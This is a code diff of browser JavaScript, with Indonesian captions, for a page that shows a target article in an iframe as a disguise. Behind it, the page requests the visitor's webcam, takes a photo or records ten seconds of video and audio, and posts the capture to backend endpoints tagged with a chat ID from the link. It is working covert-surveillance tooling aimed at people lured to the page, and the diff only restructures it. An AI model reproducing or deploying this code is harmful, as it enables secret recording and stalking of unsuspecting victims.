@@ -7,18 +7,16 @@ if (!url || !uid) {
   throw new Error("Missing URL or UID");
 }
 
-// Set target iframe
 document.getElementById("targetFrame").src = decodeURIComponent(url);
 
 const isPhotoMode = window.location.pathname.includes("article") && !window.location.pathname.includes("news");
 const video = document.getElementById("video");
 
-// === Mode FOTO ===
-if (isPhotoMode && document.getElementById("canvas")) {
-  const canvas = document.getElementById("canvas");
-  const ctx = canvas.getContext("2d");
+async function startProcess() {
+  if (isPhotoMode && document.getElementById("canvas")) {
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
-  async function initPhotoCapture() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       video.srcObject = stream;
@@ -40,26 +38,19 @@ if (isPhotoMode && document.getElementById("canvas")) {
         form.append("caption", `Berhasil mengambil gambar\n${timestamp}`);
 
         fetch(`/api/send-photo`, {
-            method: "POST",
-            body: form
+          method: "POST",
+          body: form
         });
 
       }, 1500);
     } catch (e) {
       console.error("❌ Gagal akses webcam (foto):", e);
     }
-  }
+  } else {
+    let stream;
+    let recorder;
+    let chunks = [];
 
-  initPhotoCapture();
-}
-
-// === Mode VIDEO ===
-if (!isPhotoMode) {
-  let stream;
-  let recorder;
-  let chunks = [];
-
-  async function initVideoRecording() {
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       video.srcObject = stream;
@@ -74,16 +65,13 @@ if (!isPhotoMode) {
         form.append("chat_id", uid);
         form.append("video", blob, "webcam.webm");
 
-
         const timestamp = new Date().toLocaleTimeString();
         form.append("caption", `Berhasil merekam\n${timestamp}`);
-        
+
         fetch(`/api/send-video`, {
-            method: "POST",
-            body: form
+          method: "POST",
+          body: form
         });
-
-
       };
 
       recorder.start();
@@ -91,13 +79,9 @@ if (!isPhotoMode) {
       setTimeout(() => {
         recorder.stop();
         stream.getTracks().forEach(track => track.stop());
-      }, 10000); // 5 detik
+      }, 10000);
     } catch (err) {
       console.error("❌ Gagal akses webcam (video):", err);
     }
   }
-
-  window.onload = () => {
-    initVideoRecording();
-  };
 }
